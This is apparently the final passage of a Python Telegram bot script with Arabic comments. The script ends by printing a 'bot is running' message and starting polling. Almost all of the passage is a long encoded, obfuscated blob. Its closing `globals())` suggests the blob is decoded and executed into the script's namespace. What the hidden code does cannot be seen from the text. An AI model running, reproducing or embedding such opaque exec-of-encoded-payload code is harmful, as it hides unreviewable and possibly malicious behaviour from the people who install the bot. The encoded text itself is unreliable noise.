A@V!TRvju!npj#5MC3bE0}vta{VGb^L257}Q<rP?EKTVPVX$a448CEQuMGh}MFE?*8tJ1w)5Mi))19C4zNnACaCydiNdwoqa;7Q`q-%!rc~gw<X+M%*}lRC)NQw-veg!A^hc3C(ngV?5Z<iSQ;}dO?UOmDCnnnsbH<`BVYus6&*J(9P-D_<#J4Ham>7U*nhe0gEnDVbKJ~)qel$pS>$J$p%)Dm#wq0tg)K(ehAS>teNZJVam1-TvpX*x2}4cHP?P4vJz8uR04vrdfRBQ?=hvQFdw#>Y4IdSaRD4)^y?C_Xg+40tTdlPTQ$@^FF`hSPuzeUGX}i^aH*f2m<>LGWmntt*zF$4OdU%a6zh;npgd_Re(67<~N1?(c>^ms9-0;}q;kHLGF}4|U9aJud(HG^2<`(St2x4i#GGATfyk~Yj#R_MCK6YT#x(3v1e07$meEpMW8-8g#w;+*gi{;ve%Y{{7bF>S-fUx3-0P8y7fEEdPHXs_7+%#u9@0oW!%^auKdcb(r_}<!~hIcn!FT6{wNp0Qrx16`O#;JyJ$_y*sv1G{wc)Be^<!rrE@E^f{4kjFI%)!PZZvqjBg2_yZz!vPj6)`UP!#69FVc=GDvdAyrBkX<Y4lgWYgu{Npyf|TI<sfh?`uI^1T*fc*wmyE855|8l&-R#yIgMX0SmLTe{=KqrpAC=Y7VTS!->Wk2E5+|EU$n0n|Dsq2?!T}Z_dQ2`vC_C7B_*QM+s(mGDB-t;K;7~aqQ-hPYWxS}&q}o}nJ!BFglOaR2Qz1jYQ~4S86Jk5RI?Kf*<6xsjnkrRCw?Y>lKKgN{<oB~7^lP!LG=xIlHyDqcM?Jrw7c!(<n+zNg9b{r1(mZc%6Hca_8C0BPQM4P4fjLv`zm~VSpFpAw^?}=&HTPAPVG~UYH6k58z62m0P-Hf%V9M=;l-506SRbddD%RWaK4+Dzu*FvMzjTfYzoX1<>M|r-yV$wg539HJddzJ7Jl;w#YH)-ow6(>(jVaD^A@DHg_l2Gr9AQ}3Xg|_(9gBQ!j>{Z>?spvjXFn)UDJ^|8X>2gE~G3ft7<hRPua<{b_J1#qaH2n4Ev)&b|W_ee!{8duR{|KM^W^DkWC3>(|;l5zfFG@t4wC1*d8mkkCb1lzEYj2Ss$xee{1b%O~Yt$<Lx&_O|D)_MDR1_ljgny!^B-=v6!3RYk5GRsQrQ7g62Oc)q^5ej~XB38qk~vb1k4K%|Ume4`>s*6MZm02W`h5&}&ej4Z2VS(<RWt7+N^=`cS)o77A$9*BF6%v4=Q<RV%mhi2fh)nC$`'))), globals())
# ══════════════════════════════════════════════════════════


# ┌─────────────────────────────────────────────────────────┐
# │  ▶️  تشغيل البوت                                        │
# │  #تشغيل  #polling  #run                                 │
# └─────────────────────────────────────────────────────────┘
print(" ✅ البوت يعمل.. ")
bot.infinity_polling()